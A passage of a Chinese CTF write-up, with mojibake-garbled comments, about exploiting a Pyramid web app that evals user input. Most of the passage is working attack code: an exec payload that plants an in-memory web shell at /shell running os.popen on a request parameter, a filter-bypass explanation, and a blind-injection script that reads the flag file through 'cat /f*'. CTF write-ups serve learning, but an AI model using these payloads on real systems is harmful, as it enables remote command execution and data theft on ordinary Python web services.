</span></span><span class="line"><span class="cl">    <span class="c1"># å¦‚æœåˆ†å‰²åçš„è¡¨è¾¾å¼éƒ¨åˆ†æ•°é‡ä¸ç­‰äº 2ï¼Œåˆ™è¿”å› 0 è¡¨ç¤ºä¸ç¬¦åˆè¦æ±‚</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">expr</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># å°è¯•å°†åˆ†å‰²åçš„è¡¨è¾¾å¼éƒ¨åˆ†è½¬æ¢ä¸ºæ•´æ•°</span>
</span></span><span class="line"><span class="cl">        <span class="nb">int</span><span class="p">(</span><span class="n">expr</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="nb">int</span><span class="p">(</span><span class="n">expr</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># å¦‚æœè½¬æ¢å¤±è´¥ï¼Œåˆ™è¿”å› 0 è¡¨ç¤ºä¸ç¬¦åˆè¦æ±‚</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># å¦‚æœé€šè¿‡ä¸Šè¿°æ£€æŸ¥ï¼Œåˆ™è¿”å› 1 è¡¨ç¤ºç¬¦åˆè¦æ±‚</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å®šä¹‰ä¸€ä¸ªè§†å›¾å‡½æ•°ï¼Œç”¨äºå¤„ç†ä¸»é¡µè¯·æ±‚</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">home_view</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">expr_input</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>  <span class="c1"># åˆå§‹åŒ–è¡¨è¾¾å¼è¾“å…¥ä¸ºç©ºå­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>  <span class="c1"># åˆå§‹åŒ–è®¡ç®—ç»“æœä¸ºç©ºå­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># å¦‚æœè¯·æ±‚æ–¹æ³•æ˜¯ POST</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># è·å–ç”¨æˆ·æäº¤çš„è¡¨è¾¾å¼</span>
</span></span><span class="line"><span class="cl">        <span class="n">expr_input</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">POST</span><span class="p">[</span><span class="s1">&#39;expr&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># æ£€æŸ¥è¡¨è¾¾å¼æ˜¯å¦ç¬¦åˆè¦æ±‚</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">checkExpr</span><span class="p">(</span><span class="n">expr_input</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># åœ¨å—é™ç¯å¢ƒä¸­è®¡ç®—è¡¨è¾¾å¼ç»“æœ</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">expr_input</span><span class="p">,</span> <span class="n">eval_globals</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># å¦‚æœè®¡ç®—è¿‡ç¨‹ä¸­å‡ºç°å¼‚å¸¸ï¼Œåˆ™å°†å¼‚å¸¸ä¿¡æ¯ä½œä¸ºç»“æœ</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span> <span class="o">=</span> <span class="n">e</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># å¦‚æœè¡¨è¾¾å¼ä¸ç¬¦åˆè¦æ±‚ï¼Œåˆ™è¿”å›æç¤ºä¿¡æ¯</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;çˆ¬ï¼&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># ã€xxxã€‘å¤„åº”å¡«å†™æ¨¡æ¿å­—ç¬¦ä¸²ï¼Œç”¨äºæ¸²æŸ“é¡µé¢å†…å®¹</span>
</span></span><span class="line"><span class="cl">    <span class="n">template_str</span> <span class="o">=</span> <span class="err">ã€</span><span class="n">xxx</span><span class="err">ã€‘</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># åˆ›å»º Jinja2 æ¨¡æ¿ç¯å¢ƒï¼Œä½¿ç”¨åŸºç¡€åŠ è½½å™¨</span>
</span></span><span class="line"><span class="cl">    <span class="n">env</span> <span class="o">=</span> <span class="n">Environment</span><span class="p">(</span><span class="n">loader</span><span class="o">=</span><span class="n">BaseLoader</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ä»æ¨¡æ¿å­—ç¬¦ä¸²ä¸­åŠ è½½æ¨¡æ¿</span>
</span></span><span class="line"><span class="cl">    <span class="n">template</span> <span class="o">=</span> <span class="n">env</span><span class="o">.</span><span class="n">from_string</span><span class="p">(</span><span class="n">template_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># æ¸²æŸ“æ¨¡æ¿ï¼Œå°†è¡¨è¾¾å¼è¾“å…¥å’Œè®¡ç®—ç»“æœä¼ é€’ç»™æ¨¡æ¿</span>
</span></span><span class="line"><span class="cl">    <span class="n">rendered</span> <span class="o">=</span> <span class="n">template</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="n">expr_input</span><span class="o">=</span><span class="n">expr_input</span><span class="p">,</span> <span class="n">result</span><span class="o">=</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># è¿”å›æ¸²æŸ“åçš„å“åº”å†…å®¹</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">rendered</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å¦‚æœè¯¥è„šæœ¬ä½œä¸ºä¸»ç¨‹åºè¿è¡Œ</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># åˆ›å»º Pyramid é…ç½®å¯¹è±¡</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">Configurator</span><span class="p">()</span> <span class="k">as</span> <span class="n">config</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># æ·»åŠ ä¸€ä¸ªåä¸º &#39;home_view&#39; çš„è·¯ç”±ï¼Œå¯¹åº”æ ¹è·¯å¾„ &#39;/&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;home_view&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># å°† home_view å‡½æ•°é…ç½®ä¸ºå¤„ç† &#39;home_view&#39; è·¯ç”±çš„è§†å›¾</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">home_view</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;home_view&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># æ ¹æ®é…ç½®ç”Ÿæˆ WSGI åº”ç”¨ç¨‹åº</span>
</span></span><span class="line"><span class="cl">        <span class="n">app</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">make_wsgi_app</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># åˆ›å»ºä¸€ä¸ª WSGI æœåŠ¡å™¨ï¼Œç›‘å¬æ‰€æœ‰ç½‘ç»œæ¥å£çš„ 9040 ç«¯å£</span>
</span></span><span class="line"><span class="cl">    <span class="n">server</span> <span class="o">=</span> <span class="n">make_server</span><span class="p">(</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">9040</span><span class="p">,</span> <span class="n">app</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å¯åŠ¨æœåŠ¡å™¨ï¼Œå¼€å§‹å¤„ç†è¯·æ±‚</span>
</span></span><span class="line"><span class="cl">    <span class="n">server</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="link" href="https://xz.aliyun.com/news/16090?u_atoken=87dba66839b39d2b13eae6e4583416ca&amp;u_asig=0a47309317440258787906072e00fe"  target="_blank" rel="noopener"
    >å¯¹pyramidæ¡†æ¶æ— å›æ˜¾çš„å­¦ä¹ &mdash;ä»¥ä¸€é“ctfé¢˜ç›®ä¸ºä¾‹-å…ˆçŸ¥ç¤¾åŒº</a></p>
<h4 id="æ‰“pyramidå†…å­˜é©¬">æ‰“pyramidå†…å­˜é©¬
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">expr</span><span class="o">=</span><span class="n">exec</span><span class="p">(</span><span class="s2">&#34;import sys;config = sys.modules[&#39;__main__&#39;].config;app=sys.modules[&#39;__main__&#39;].app;print(config);config.add_route(&#39;shell&#39;, &#39;/shell&#39;);config.add_view(lambda request: Response(__import__.(&#39;os&#39;).popen(request.params.get(&#39;1&#39;)).read()),route_name=&#39;shell&#39;);app = config.make_wsgi_app()&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="c1">#è¿™è¡Œä»£ç å¯¼å…¥äº†Pythonçš„æ ‡å‡†åº“æ¨¡å—sysï¼Œç”¨äºè®¿é—®ä¸Pythonè§£é‡Šå™¨ç´§å¯†ç›¸å…³çš„å˜é‡å’Œå‡½æ•°ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="n">config</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">config</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#è¿™å½“å‰è¿è¡Œç¯å¢ƒä¸­å­˜åœ¨åä¸ºconfigçš„å¯¹è±¡ï¼Œå¹¶ä¸”å®ƒæ˜¯å…¨å±€å‘½åç©ºé—´çš„ä¸€éƒ¨åˆ†ï¼ˆå³ä½äº__main__æ¨¡å—ä¸­ï¼‰ã€‚configå¯¹è±¡é€šå¸¸ç”¨äºå­˜å‚¨åº”ç”¨ç¨‹åºé…ç½®ä¿¡æ¯ï¼Œåœ¨Pyramidæ¡†æ¶ä¸­ï¼Œå®ƒè¿˜è´Ÿè´£å®šä¹‰åº”ç”¨çš„è¡Œä¸ºï¼Œå¦‚è·¯ç”±è§„åˆ™ç­‰ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">app</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#ç±»ä¼¼åœ°ï¼Œappä¹Ÿè¢«è®¤ä¸ºæ˜¯åœ¨å…¨å±€å‘½åç©ºé—´ä¸­å­˜åœ¨çš„ä¸€ä¸ªå˜é‡ï¼Œä»£è¡¨äº†WSGIå…¼å®¹çš„åº”ç”¨å®ä¾‹ã€‚WSGI(Web Server Gateway Interface)æ˜¯ä¸€ç§ç”¨äºPython webåº”ç”¨å’ŒæœåŠ¡ä¹‹é—´é€šä¿¡çš„æ ‡å‡†æ¥å£ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">config</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#è¿™è¡Œä»£ç ç®€å•åœ°æ‰“å°å‡ºconfigå¯¹è±¡çš„å†…å®¹ï¼Œä¸ºäº†æ›´å¥½è°ƒè¯•ï¼Œæ£€æŸ¥å…¶æ˜¯å¦æ­£ç¡®åŠ è½½ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;shell&#39;</span><span class="p">,</span> <span class="s1">&#39;/shell&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#æ­¤è¡Œè°ƒç”¨äº†configå¯¹è±¡çš„æ–¹æ³•add_routeï¼Œç”¨äºå‘Webåº”ç”¨æ·»åŠ ä¸€ä¸ªæ–°çš„URLè·¯ç”±ã€‚è¿™é‡Œçš„è·¯ç”±åç§°ä¸º&#39;shell&#39;ï¼Œå¯¹åº”çš„è·¯å¾„æ˜¯&#39;/shell&#39;ã€‚è¿™æ„å‘³ç€å½“ç”¨æˆ·è®¿é—®è¿™ä¸ªç‰¹å®šçš„URLæ—¶ï¼Œä¼šè§¦å‘ä¸ä¹‹å…³è”çš„è§†å›¾é€»è¾‘ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="k">lambda</span> <span class="n">request</span><span class="p">:</span> <span class="n">Response</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()),</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;shell&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#è¿™æ˜¯å…³é”®çš„ä¸€è¡Œï¼Œå®ƒå®šä¹‰äº†ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼ˆlambdaè¡¨è¾¾å¼ï¼‰ï¼Œè¯¥å‡½æ•°æ¥å—ä¸€ä¸ªrequestå‚æ•°å¹¶è¿”å›ä¸€ä¸ªHTTPå“åº”ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå®ƒä½¿ç”¨äº†__import__(&#39;os&#39;).popen(...)æ¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚æ›´å…·ä½“åœ°è¯´ï¼Œå®ƒä»è¯·æ±‚å‚æ•°ä¸­è·å–é”®ä¸º&#39;1&#39;çš„å€¼ï¼Œå¹¶å°†å…¶ä½œä¸ºå‘½ä»¤ä¼ é€’ç»™ç³»ç»Ÿshellæ‰§è¡Œã€‚ç„¶åï¼Œå®ƒè¯»å–å‘½ä»¤æ‰§è¡Œçš„ç»“æœï¼Œå¹¶é€šè¿‡Responseå¯¹è±¡å°†å…¶ä½œä¸ºHTTPå“åº”ä½“å‘é€å›å®¢æˆ·ç«¯ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">make_wsgi_app</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#æœ€åï¼Œè¿™è¡Œä»£ç è°ƒç”¨äº†configä¸Šçš„make_wsgi_appæ–¹æ³•ï¼Œåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„WSGIåº”ç”¨å®ä¾‹ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™appå˜é‡ã€‚è¿™ä¸€æ­¥éª¤å®Œæˆäº†åº”ç”¨çš„æ„å»ºè¿‡ç¨‹ã€‚</span>
</span></span></code></pre></td></tr></table>
</div>
</div><img src="image-20250418120012044.png" alt="image-20250418120012044" style="zoom:50%;" />
<p>ä½†æ˜¯è¿™é‡Œå…¶å®è¿‡æ»¤äº†importï¼Œä½†æ˜¯è¿˜æ˜¯èƒ½æ‰“,åŸå› </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">exec</span> <span class="n">ä¸­æ‰§è¡Œçš„</span> <span class="kn">import</span> <span class="nn">è¯­å¥å…¶å®æ˜¯è¯­æ³•å±‚çº§çš„å…³é”®è¯</span><span class="err">ï¼Œ</span><span class="n">å®ƒä¸æ˜¯</span> <span class="nb">__import__</span><span class="p">()</span><span class="err">ï¼Œ</span><span class="n">Python</span> <span class="n">çš„</span> <span class="kn">import</span> <span class="nn">xxx</span> <span class="n">ä¼šåœ¨å†…éƒ¨å°è¯•è°ƒç”¨</span> <span class="nb">__import__</span><span class="err">ï¼Œ</span><span class="n">ä½†å¦‚æœæ¨¡å—å·²ç»å­˜åœ¨äº</span> <span class="n">sys</span><span class="o">.</span><span class="n">modules</span> <span class="n">é‡Œ</span><span class="err">ï¼Œ</span><span class="n">å®ƒå°±ç›´æ¥å¤ç”¨ç¼“å­˜çš„æ¨¡å—</span><span class="err">ï¼Œ</span><span class="n">ä¸å†è°ƒç”¨</span> <span class="nb">__import__</span><span class="p">()</span><span class="err">ï¼Œ</span><span class="kn">import</span> <span class="nn">os</span> <span class="n">æˆåŠŸäº†</span><span class="err">ï¼Œ</span><span class="n">æ˜¯å› ä¸º</span> <span class="n">os</span> <span class="n">å·²ç»åœ¨è§£é‡Šå™¨ç¯å¢ƒä¸­è¢«åŠ è½½è¿‡äº†</span><span class="err">ï¼Œ</span><span class="n">Python</span> <span class="n">å°±ç›´æ¥å¤ç”¨äº†</span><span class="err">ï¼Œ</span><span class="n">ä¸å†è°ƒç”¨</span> <span class="nb">__import__</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">åŸç†</span><span class="err">ï¼š</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span> 
</span></span><span class="line"><span class="cl"><span class="o">--&gt;</span> <span class="n">å®é™…ä¸Šè°ƒç”¨</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">--&gt;</span> <span class="n">å…ˆçœ‹</span> <span class="n">sys</span><span class="o">.</span><span class="n">modules</span> <span class="n">æ˜¯å¦å·²ç»æœ‰</span> <span class="s1">&#39;os&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="o">--&gt;</span> <span class="n">æœ‰çš„è¯ç›´æ¥å¤ç”¨</span><span class="err">ï¼Œ</span><span class="n">ä¸è°ƒç”¨</span> <span class="nb">__import__</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="o">--&gt;</span> <span class="n">æ²¡æœ‰æ‰ä¼šå»è°ƒç”¨</span> <span class="nb">__import__</span><span class="p">()</span> <span class="n">åŠ è½½æ–°æ¨¡å—</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>wpæ˜¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">expr</span><span class="o">=</span><span class="n">exec</span><span class="p">(</span><span class="s2">&#34;config.add_route(&#39;shell_route&#39;,&#39;/shell&#39;);config.add_view(lambda request:Response(__import__.(&#39;os&#39;).popen(request.params.get(&#39;1&#39;)).read()),route</span>
</span></span><span class="line"><span class="cl"><span class="n">_name</span><span class="o">=</span><span class="s1">&#39;shell_route&#39;</span><span class="p">);</span><span class="n">app</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">make_wsgi_app</span><span class="p">()</span><span class="s2">&#34;)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="æ‰“æ—¶é—´ç›²æ³¨">æ‰“æ—¶é—´ç›²æ³¨
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>  <span class="c1"># å¯¼å…¥å­—ç¬¦ä¸²æ¨¡å—ï¼Œç”¨äºç”Ÿæˆå¾…çŒœæµ‹çš„å­—ç¬¦é›†</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>  <span class="c1"># å¯¼å…¥requestsåº“ï¼Œç”¨äºå‘é€HTTPè¯·æ±‚</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">tqdm</span>  <span class="c1"># å¯¼å…¥tqdmåº“ï¼Œç”¨äºæ˜¾ç¤ºè¿›åº¦æ¡</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1:50800/&#34;</span>  <span class="c1"># ç›®æ ‡URLåœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;TGCTF{&#34;</span>  <span class="c1"># åˆå§‹åŒ–flagå˜é‡ï¼Œå­˜å‚¨å·²çŒœæµ‹å‡ºçš„æ——å¸œå­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å¤–å±‚å¾ªç¯ï¼Œéå†æ——å¸œå­—ç¬¦ä¸²çš„æ¯ä¸ªä½ç½®ï¼Œä»å½“å‰flagé•¿åº¦å¼€å§‹ï¼Œç›´åˆ°ç¬¬50ä¸ªå­—ç¬¦ä½ç½®</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="mi">50</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å†…å±‚å¾ªç¯ï¼Œéå†å¾…çŒœæµ‹çš„å­—ç¬¦é›†ï¼ŒåŒ…æ‹¬ç‰¹å®šç¬¦å·ã€å°å†™å­—æ¯å’Œæ•°å­—</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="o">+</span><span class="s1">&#39;}&#39;</span><span class="o">+</span><span class="s1">&#39;{&#39;</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># æ„é€ POSTè¯·æ±‚çš„æ•°æ®å­—å…¸ï¼ŒåŒ…å«æ¶æ„æ„é€ çš„è¡¨è¾¾å¼</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># è¯¥è¡¨è¾¾å¼é€šè¿‡è¯»å–ç›®æ ‡æ–‡ä»¶çš„ç¬¬iä¸ªå­—ç¬¦å¹¶åˆ¤æ–­æ˜¯å¦ç­‰äºå½“å‰çŒœæµ‹å­—ç¬¦s</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># åˆ©ç”¨operator.eqè¿›è¡Œå­—ç¬¦æ¯”è¾ƒï¼Œè‹¥ç›¸ç­‰åˆ™è¿›è¡Œå–å€’æ•°æ“ä½œï¼Œå¯¼è‡´æœåŠ¡ç«¯é”™è¯¯</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;expr&#34;</span><span class="p">:</span><span class="sa">f</span><span class="s2">&#34;import os,operator;f=os.popen(&#39;cat /f*&#39;).read();a=int(operator.eq(f[</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">],&#39;</span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="s2">&#39;));1/a&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># å‘é€POSTè¯·æ±‚åˆ°ç›®æ ‡URLï¼Œæºå¸¦æ„é€ çš„æ¶æ„è¡¨è¾¾å¼æ•°æ®</span>
</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># æ ¹æ®æœåŠ¡ç«¯è¿”å›çš„å†…å®¹åˆ¤æ–­çŒœæµ‹æ˜¯å¦æ­£ç¡®</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># è‹¥è¿”å›å†…å®¹ä¸æ˜¯ç‰¹å®šçš„é”™è¯¯ä¿¡æ¯ï¼Œåˆ™è®¤ä¸ºçŒœæµ‹æ­£ç¡®</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span> <span class="o">!=</span> <span class="s2">&#34;A server error occurred.  Please contact the administrator.&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="n">s</span>  <span class="c1"># å°†æ­£ç¡®çŒœæµ‹çš„å­—ç¬¦æ·»åŠ åˆ°æ——å¸œå­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>  <span class="c1"># æ‰“å°å½“å‰å·²çŒœå‡ºçš„æ——å¸œå­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>  <span class="c1"># è·³å‡ºå†…å±‚å¾ªç¯ï¼Œç»§ç»­çŒœæµ‹ä¸‹ä¸€ä¸ªå­—ç¬¦ä½ç½®</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>  <span class="c1"># æ‰“å°å½“å‰å·²çŒœæµ‹çš„å­—ç¬¦ä½ç½®ç´¢å¼•</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="cry">Cry
</h2><h3 id="è´¹å…‹ç‰¹å°”"><strong>è´¹å…‹ç‰¹å°”</strong>
</h3><p>åˆ†è§£åæ˜¯5ä¸ªç´ æ•°ï¼Œaiæ¢­äº†</p>
